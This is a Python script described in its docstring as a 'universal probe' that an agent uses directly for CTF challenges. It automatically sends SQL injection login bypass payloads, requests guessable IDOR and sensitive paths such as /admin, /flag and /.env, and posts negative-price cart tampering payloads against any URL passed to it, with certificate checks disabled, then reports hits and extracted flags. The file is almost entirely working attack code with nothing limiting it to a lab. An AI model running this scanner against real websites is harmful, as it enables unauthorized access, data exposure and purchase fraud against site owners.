#!/usr/bin/env python3
"""万能探针——POST/GET/Cookie/Form全支持。Agent直接拿这个打CTF"""
import urllib.request as u, urllib.parse as p, ssl, json, sys, re, http.cookiejar as cj

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = False

def request(url, method="GET", data=None, cookies=None, headers=None, follow=True):
    h = {"User-Agent": "HiveSwarm/1.0"}
    if headers:
        h.update(headers)
    body = None
    if data:
        if isinstance(data, dict):
            body = p.urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str):
            body = data.encode()
    req = u.Request(url, data=body, headers=h, method=method)
    if cookies:
        req.add_header("Cookie", cookies)
    try:
        resp = u.urlopen(req, timeout=10, context=ctx)
        return resp.status, resp.read().decode(errors="replace"), dict(resp.headers)
    except u.HTTPError as e:
        return e.code, e.read().decode(errors="replace"), dict(e.headers)
    except Exception as e:
        return None, str(e), {}


SQLI_PAYLOADS = [
    ("username", "' OR '1'='1", "x", "Boolean OR"),
    ("username", "admin'--", "x", "Comment bypass"),
    ("username", "' UNION SELECT 1,2,3--", "x", "UNION probe"),
    ("password", "' OR 1=1--", "", "Pass field inject"),
    ("username+password", "'='", "'='", "Tautology"),
]

IDOR_PATHS = [
    "/edit", "/edit/0", "/edit/1", "/edit/2",
    "/view/1", "/view/2", "/user/1", "/profile/1",
    "/admin", "/flag", "/debug", "/api", "/.env",
]

CART_PAYLOADS = [
    '[{"price":-99999,"qty":1,"name":"test"}]',
    '[{"id":1,"price":0,"qty":999}]',
    '[]',
]

def probe_sqli(base_url, login_path="/login"):
    for field, val1, val2, label in SQLI_PAYLOADS:
        if "+" in field:
            f1, f2 = field.split("+")
            data = {f1: val1, f2: val2}
        else:
            data = {field: val1, "password" if field=="username" else "username": val2}
        code, body, _ = request(base_url + login_path, "POST", data=data)
        if code == 200 and "Invalid" not in body and "error" not in body.lower()[:200]:
            return {"type": "SQLi", "found": True, "field": field, "payload": f"{val1}+{val2}", "status": code}

def probe_idor(base_url):
    for path in IDOR_PATHS:
        url = base_url.rstrip("/") + path
        code, body, _ = request(url)
        if code == 200 and len(body) > 300:
            flags = re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$", body)
            if flags:
                return {"type": "IDOR/Flag", "found": True, "path": path, "flag": flags[0]}
            if "flag" in body.lower() or "admin" in body.lower()[:300]:
                return {"type": "IDOR", "found": True, "path": path, "status": code, "preview": body[:200]}

def probe_cart(base_url, cart_path="/checkout", cart_param="cart"):
    for payload in CART_PAYLOADS:
        data = {cart_param: payload}
        code, body, _ = request(base_url + cart_path, "POST", data=data)
        if code == 200:
            flags = re.findall(r"\^FLAG\^[a-f0-9]+\$FLAG\$", body)
            if flags:
                return {"type": "Cart/Price", "found": True, "payload": payload[:60], "flag": flags[0]}
            if len(body) < 1000 and body.strip():
                return {"type": "Cart", "found": True, "payload": payload[:60], "body": body[:200]}


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else ""
    if not target:
        print(json.dumps({"error": "Usage: universal-probe.py <URL>"}))
        sys.exit(1)

    results = []
    for probe in [probe_sqli, probe_idor, probe_cart]:
        try:
            r = probe(target)
            if r:
                results.append(r)
        except Exception as e:
            results.append({"error": str(e)[:100]})

    print(json.dumps(results, ensure_ascii=False, indent=2))
